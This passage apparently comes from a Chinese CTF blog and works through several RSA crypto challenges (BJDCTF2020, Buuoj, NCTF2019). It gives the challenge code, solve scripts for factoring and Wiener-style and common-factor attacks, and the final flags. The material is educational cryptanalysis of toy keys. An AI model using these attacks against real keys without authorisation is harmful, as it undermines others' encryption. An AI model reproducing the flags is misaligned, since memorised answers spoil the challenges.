class="number">1</span>:</span><br><span class="line">        d = invert(e,phi)</span><br><span class="line">        x = <span class="built_in">pow</span>(<span class="built_in">int</span>(c),<span class="built_in">int</span>(d),n)</span><br><span class="line">        flag = <span class="built_in">str</span>(long_to_bytes(x))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;CTF&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">&quot;ctf&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;rs4_1s_s1mpl3!#&#125;</code></p>
<h2 id="BJDCTF2020-easyrsa"><a href="#BJDCTF2020-easyrsa" class="headerlink" title="[BJDCTF2020]easyrsa"></a>[BJDCTF2020]easyrsa</h2><ol>
<li>题目给了rsa_task.py，具体如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> Derivative</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">z=Fraction(<span class="number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="number">1</span>,Derivative(arth(q),q))</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(c,z,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line"><span class="string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line"><span class="string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>所以基本思路是由z求出p和q，再有p,q,e得到d，由c,d,n求m即可得到最终的flag  </p>
</li>
<li><p>由z求p,q。首先$z=\frac{1}{arctan’(p)}\ -\ \frac{1}{arth’(q)}$，其中$arctan’(p)=\frac{1}{1+p^{2}}$，$arth’(q)=\frac{1}{1-q^{2}}$，因此有$z=p^{2}+q^{2}$。同时我们已知有$n=pq$，z和n的值已知，利用z3库联立解方程即可。代码如下：  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># z = p^2 + q^2</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line">z = <span class="number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line"></span><br><span class="line">p = Int(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">q = Int(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(p**<span class="number">2</span> + q**<span class="number">2</span> == z)</span><br><span class="line">s.add(p*q == n)</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure>
<p>最终输出可得：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = 144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span><br><span class="line">q = 105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span><br></pre></td></tr></table></figure>
<ol>
<li>由p,q,e,c,n求m，并得到flag  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">c = <span class="number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span></span><br><span class="line">n = <span class="number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span></span><br><span class="line">q = <span class="number">105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span></span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>BJD&#123;Advanced_mathematics_is_too_hard!!!&#125;</code>  </p>
<h2 id="Buuoj-rsa2"><a href="#Buuoj-rsa2" class="headerlink" title="Buuoj rsa2"></a>Buuoj rsa2</h2><ol>
<li>题目是一个py文件，具体如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(<span class="built_in">hex</span>(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><p>通过RSA Wiener Attack（维纳攻击）求得<br>d=8920758995414587152829426558580025657357328745839747693739591820283538307445</p>
</li>
<li><p>当在Python3环境下求解flag时报错，提示要先编码。但是我尝试用utf-8和latin1编码再求md5后，得到的flag提交还是不对，有点坑，最后还是用的Python2，flag的那行代码不需要修改。最终结果为：<br><code>flag&#123;47bf28da384590448e0b0d23909a25a4&#125;</code></p>
</li>
</ol>
<h2 id="BJDCTF2020-RSA"><a href="#BJDCTF2020-RSA" class="headerlink" title="[BJDCTF2020]RSA"></a>[BJDCTF2020]RSA</h2><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">assert</span>(e&lt;<span class="number">100000</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(<span class="number">294</span>,e,n)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(<span class="string">&quot;BJD&quot;</span>*<span class="number">32</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span> c,n</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line"><span class="string">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="string">979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721  12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol>
<li>前半部分可以得到（c,n,x已知）：<br>&emsp;&emsp;$c=m^{e}\ mod\ n$<br>对第二个print出来的值如果设为x，有：<br>&emsp;&emsp;$x=294^{e}\ mod\ n$  </li>
<li><p>后半部分有（c2,m2,n2已知）：<br>&emsp;&emsp;$c2=m2^{e}\ mod\ n2$  </p>
</li>
<li><p>解题首要目标自然是e，由于1中第二个表达式数值较小，本打算用sage求离散对数得到e但是跑不出来，所以用Python进行0，100000的遍历找这个e的值  </p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">x = <span class="number">381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="number">294</span>,e,n) == x:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure>
<p>得到e=52361  </p>
<ol>
<li>然后希望求得p,q的值以求d。但是想直接分解n的值太困难了。这里n和n2已知，且它们有最大公因数q，可直接求得，所以解题代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120</span></span><br><span class="line">n = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line">n2 = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line">e = <span class="number">52361</span></span><br><span class="line">q = gcd(n,n2)</span><br><span class="line">p = n // q</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
<p><code>BJD&#123;p_is_common_divisor&#125;</code>  </p>
<h2 id="NCTF2019-babyRSA"><a href="#NCTF2019-babyRSA" class="headerlink" title="[NCTF2019]babyRSA"></a>[NCTF2019]babyRSA</h2><h3 id="题目代码-1"><a href="#题目代码-1" class="headerlink" title="题目代码"></a>题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nextPrime</span>(<span class="params">n</span>):</span></span><br><span class="line">    n += <span class="number">2</span> <span class="keyword">if</span> n &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(n):</span><br><span class="line">        n += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = nextPrime(p)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line"><span class="comment"># c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br></pre></td></tr></table></figure>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p><a href="https://blog.csdn.net/weixin_44110537/article/details/107214109">参考1</a><br><a href="https://blog.csdn.net/weixin_44017838/article/details/105116339">参考2</a>  </p>
<ol>
<li>e,d已知，先确定$ed-1$的位数。  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">x = gmpy2.log2(e*d-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure>
<p>结果为：2063.2545176257354  </p>
<ol>
<li>p的位数为1024，q在p的附近所以大致也是1024位。$\phi(n)$的位数约为2048，而$ed-1$大概是2063~2064位，所以$ed-1=1+x\phi(n)$中的x的位数为15~16。  </li>
<li>在$2^{15}$~$2^{16}$减遍历x，找到可以被x整除的$ed-1$。那么有$\phi(n)=\frac{ed-1}{x}$  </li>
<li>找到这个$\phi(n)$，因此p和q大小相近，可以取$\phi(n)$平方根，在其附近的素数取为p，得到p值就很容易找到q，只要它们都是素数，将它们相乘得到n，随即得到明文。  </li>
<li>解题代码：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913</span></span><br><span class="line">c = <span class="number">5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">15</span>,<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*d - <span class="number">1</span>) % x == <span class="number">0</span>:</span><br><span class="line">        phn = (e*d - <span class="number">1</span>) // x</span><br><span class="line">        p = nextprime(iroot(phn,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        q = phn // (p-<span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q) <span class="keyword">and</span> isPrime(p):</span><br><span class="line">            <span class="built_in">print</span>(p, q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># p = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225076497</span></span><br><span class="line"><span class="comment"># q = 143193611591752210918770476402384783351740028841763223236102885221839966637073188462808195974548579833368313904083095786906479416347681923731100260359652426441593107755892485944809419189348311956308456459523437459969713060653432909873986596042482699670451716296743727525586437248462432327423361080811225075839</span></span><br><span class="line">n = p*q</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>NCTF&#123;70u2_nn47h_14_v3ry_gOO0000000d&#125;</code></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414?fr=aladdin">https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95/2029414?fr=aladdin</a><br>[2] FlappyPig.CTF特训营<br>[3] <a href="https://www.freebuf.com/articles/database/170814.html?replytocom=249214">https://www.freebuf.com/articles/database/170814.html?replytocom=249214</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
</search>
